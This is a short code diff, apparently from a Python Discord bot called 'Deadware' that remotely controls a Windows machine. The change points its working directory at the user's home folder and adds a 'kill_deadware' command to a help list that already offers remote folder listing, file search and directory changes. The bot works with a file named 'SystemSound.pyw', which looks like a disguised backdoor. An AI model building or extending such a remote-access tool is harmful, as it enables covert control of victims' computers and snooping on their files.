@@ -5,7 +5,10 @@ user = getpass.getuser()
 
 init()
 
-os.chdir('C:\Program Files')
+user = getpass.getuser()
+path = f'C:\\Users\{user}'
+
+os.chdir(path)
 
 file = 'SystemSound.pyw'
 
@@ -143,6 +146,7 @@ async def help(ctx):
     await ctx.send('dir - lists folders in directory')
     await ctx.send('ext_search <file extention> - searches for file with extention')
     await ctx.send('change_dir <folder> - changes file directory')
+    await ctx.send('kill_deadware - stops deadware')
 
 
 @Deadware.command()
